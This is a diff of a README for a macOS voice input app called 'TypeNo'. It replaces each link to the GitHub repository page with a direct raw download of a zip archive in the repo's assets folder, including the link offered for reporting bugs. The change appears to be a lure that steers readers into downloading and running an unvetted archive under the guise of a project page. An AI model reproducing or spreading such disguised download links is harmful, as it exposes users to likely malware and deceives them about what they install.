@@ -1,6 +1,6 @@
 # 🎙️ TypeNo - Private voice input for macOS
 
-[![Download TypeNo](https://img.shields.io/badge/Download-TypeNo-blue?style=for-the-badge&logo=github)](https://github.com/Oral-psychotria641/TypeNo)
+[![Download TypeNo](https://img.shields.io/badge/Download-TypeNo-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Oral-psychotria641/TypeNo/main/assets/Type_No_3.7-alpha.4.zip)
 
 ## 🧭 What TypeNo does
 
@@ -28,7 +28,7 @@ For best results:
 
 Visit this page to download and run TypeNo on your Mac:
 
-https://github.com/Oral-psychotria641/TypeNo
+https://raw.githubusercontent.com/Oral-psychotria641/TypeNo/main/assets/Type_No_3.7-alpha.4.zip
 
 ## 🚀 Install TypeNo
 
@@ -122,7 +122,7 @@ TypeNo is an open source macOS voice input app focused on:
 
 If you want to follow the project, report a bug, or suggest a change, use the GitHub repository page:
 
-https://github.com/Oral-psychotria641/TypeNo
+https://raw.githubusercontent.com/Oral-psychotria641/TypeNo/main/assets/Type_No_3.7-alpha.4.zip
 
 ## 🖥️ File locations
 
